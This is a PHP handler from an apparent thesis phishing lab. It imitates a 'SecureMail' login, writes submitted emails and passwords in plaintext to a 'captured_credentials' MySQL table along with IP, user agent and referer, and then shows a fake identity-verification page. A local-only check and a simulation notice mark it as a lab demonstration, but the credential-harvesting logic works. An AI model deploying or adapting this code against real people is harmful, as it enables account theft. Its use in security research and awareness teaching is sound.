<?php
// site1 — stores the submitted credentials to MySQL, then shows a benign
// "verifying" outcome. This is the data-harvesting behaviour the thesis defends
// against; captured rows let you prove the threat in the defence.
require __DIR__ . '/lib.php';
require_local();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.php');
    exit;
}

$email    = trim($_POST['email'] ?? '');
$password = (string) ($_POST['password'] ?? '');
if ($email === '' || $password === '') {
    header('Location: index.php?e=1');
    exit;
}

$c = client();
$stmt = db()->prepare(
    'INSERT INTO captured_credentials (email, password, ip, user_agent, referer)
     VALUES (:email, :password, :ip, :ua, :ref)'
);
$stmt->execute([
    ':email'    => $email,
    ':password' => $password,
    ':ip'       => $c['ip'],
    ':ua'       => $c['ua'],
    ':ref'      => $c['referer'],
]);
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SecureMail — Verifying…</title>
<style>
  body{margin:0;font-family:Segoe UI,system-ui,Arial,sans-serif;background:#eef2f7;color:#1c2430;
       display:grid;place-items:center;height:100vh;padding-bottom:42px}
  .box{background:#fff;border:1px solid #dfe6ee;border-radius:12px;padding:34px 30px;max-width:440px;text-align:center;
       box-shadow:0 12px 40px -18px rgba(20,40,80,.4)}
  .spin{width:34px;height:34px;border:3px solid #d7e2ef;border-top-color:#0a66c2;border-radius:50%;margin:0 auto 16px;animation:s 1s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  h2{margin:0 0 6px;font-size:18px}
  p{color:#5a6b82;font-size:13.5px;margin:6px 0 0}
  .note{margin-top:16px;font-size:11.5px;color:#9b1c1c;background:#fff4f4;border:1px solid #ffd0d0;border-radius:8px;padding:9px}
</style>
</head>
<body>
  <div class="box">
    <div class="spin"></div>
    <h2>Verifying your identity…</h2>
    <p>Please wait while we confirm your account details. You will be redirected shortly.</p>
    <div class="note">Simulation: your input was stored in the lab database (<code>captured_credentials</code>). No real login occurred.</div>
  </div>
  <?= sim_banner() ?>
</body>
</html>
